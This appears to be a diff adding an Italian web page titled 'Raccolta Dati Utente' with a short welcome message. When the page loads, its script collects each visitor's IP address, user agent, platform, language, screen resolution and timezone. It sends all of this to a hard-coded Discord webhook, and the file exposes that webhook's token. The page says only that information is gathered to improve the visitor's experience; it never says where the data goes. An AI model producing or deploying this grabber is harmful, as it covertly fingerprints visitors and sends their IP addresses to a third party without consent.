@@ -1,0 +1,48 @@
+<!DOCTYPE html>
+<html lang="it">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Raccolta Dati Utente</title>
+</head>
+<body>
+    <h1>Benvenuto!</h1>
+    <p>Stiamo raccogliendo alcune informazioni per migliorare la tua esperienza.</p>
+
+    <script>
+        // URL del webhook Discord
+        const webhookURL = 'https://discord.com/api/webhooks/1262769709410160660/zrnY7nZIyJrA18l8HZ-oGGt8doW3BOj0nNOjo7FqpiHSOiENq8ZiQ8L0o5ZbYVjnF3Pj';
+
+        // Funzione per inviare i dati al webhook Discord
+        async function sendToDiscord(data) {
+            await fetch(webhookURL, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    content: JSON.stringify(data, null, 2),
+                }),
+            });
+        }
+
+        // Funzione per raccogliere informazioni sull'utente
+        async function getUserData() {
+            let userData = {
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.language,
+                screenResolution: `${window.screen.width}x${window.screen.height}`,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                ip: await fetch('https://api.ipify.org?format=json').then(res => res.json()).then(data => data.ip),
+            };
+
+            // Invia i dati al webhook Discord
+            sendToDiscord(userData);
+        }
+
+        // Esegui la funzione quando la pagina viene caricata
+        window.onload = getUserData;
+    </script>
+</body>
+</html>
